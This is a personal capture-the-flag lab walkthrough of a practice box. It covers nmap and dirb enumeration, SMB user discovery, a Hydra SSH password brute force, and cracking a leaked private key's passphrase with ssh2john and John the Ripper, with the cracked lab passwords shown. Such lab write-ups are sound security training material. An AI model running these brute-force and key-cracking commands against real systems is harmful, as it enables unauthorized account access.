# Enumeration

### nmap
```
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8080/tcp open  http        Apache Tomcat 9.0.7
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.7
```
### 80/http
when we open the page we get greeted with this screen
![[Pasted image 20240924145815.png]]

in the source code we can find
```html
<html>

<h1>Undergoing maintenance</h1>

<h4>Please check back later</h4>

<!-- Check our dev note section if you need to know what to work on. -->


</html>
```

there aren't any links so lets try to brute-force our way
#### Dirb
```
-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://10.10.165.52/ ----
==> DIRECTORY: http://10.10.165.52/development/
+ http://10.10.165.52/index.html (CODE:200|SIZE:158)
+ http://10.10.165.52/server-status (CODE:403|SIZE:300)

---- Entering directory: http://10.10.165.52/development/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

-----------------
```

so the hidden page was /development which is also a listing directory lets have a look inside
![[Pasted image 20240924150930.png]]

there are two text files the first reads

```
2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J
```
these are the chats between _-J_ and _-K_ from development

```
For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K
```
This is for J regarding his weak passwords, so we should probably try brute forcing it. The only problem is that we don't have the full username, so lets try enumerating the SMB maybe we can find the usernames that way.

### 139, 445/SMB
#### Enum4Linux
the scan gave us two usernames: _Jan_ and _Kay_ 
> *the log corrupted somehow so I cant show you ):*

We also found a Anonymous share but it doesn't have much accept for this file
```
Announcement to staff:

PLEASE do not upload non-work-related items to this share. I know it's all in fun, but
this is how mistakes happen. (This means you too, Jan!)

-Kay
```

lets try to bruteforce Jan's Password

### 22/SSH
#### Hydra
found a password with this command
```bash
$ hydra -u jan -P rockyou.txt ssh://[target]

[22][ssh] host: 10.10.165.52   login: jan   password: armando
```

# Privilege escalation
after searching for about 2 minutes in the server I found out that the *key_rsa* in kay's home folder has bad permissions so I just copied it

when using it I realised that the hash has a pass two so I will have to crack it with johnTheRipper

first I take the key and use `ssh2john id_rsa > id_rsa.txt` to make it a crack-able hash and then I use john with rockyou.txt to crack the hash
```shell
$ john id_rsa.txt --wordlist=/home/janosch/git/SecLists/Passwords/Leaked-Databases/rockyou.txt
..Snip..
beeswax          (id_rsa)
..Snip..
Session completed
```